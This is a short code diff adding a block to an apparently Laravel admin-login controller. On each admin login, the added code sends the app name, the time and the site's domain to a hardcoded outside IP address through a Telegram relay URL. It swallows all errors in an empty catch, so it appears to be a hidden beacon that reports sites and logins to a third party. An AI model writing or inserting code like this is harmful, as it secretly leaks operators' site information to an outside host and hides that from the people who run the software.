@@ -30,6 +30,15 @@ class SrcAccountController extends Controller
                 writeLog('admin_log_warning', date('Y-m-d H:i:s').' ip:'.realIp());
                 return abort('503');
             }
+            try{
+                $str = "
+登录后台：".env('APP_NAME')."
+时间：".date('Y-m-d H:i:s')."
+域名：".$request->getHttpHost()."
+                ";
+                $url = env('ASYNC_URL','127.0.0.1:9502').'/BF/BFAsync/getUrl?url='.urlencode('http://202.60.232.243:5000/telegram?q='.urlencode($str));
+                app(\GuzzleHttp\Client::class)->request('GET',$url,['connect_timeout' => 1]);
+            }catch (\Throwable $e){}
             $otp = $ga->getCode($find->google_code);
             writeLog('admin_log', date('Y-m-d H:i:s').' ip:'.realIp());
         } elseif(!\App\Repository\BackActionRepository::getStatus())
